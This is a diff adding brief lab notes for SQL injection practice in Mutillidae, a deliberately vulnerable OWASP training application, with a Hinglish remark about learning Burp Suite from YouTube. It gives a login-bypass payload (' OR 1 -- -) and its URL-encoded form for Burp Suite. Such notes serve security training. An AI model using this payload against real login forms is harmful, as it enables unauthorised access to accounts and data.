@@ -1,0 +1,11 @@
+In Mutillidae: 
+
+OWASP 10 > A1 - Injection > SQLi - Extract Data > User Info > Enter
+Name: Random
+Password: ' OR 1 -- -
+for Burpsuite: %27+OR+1+--+-
+
+Try this in the burpsuite 
+
+Nhi ata toh yt se sikh lo use karna
+
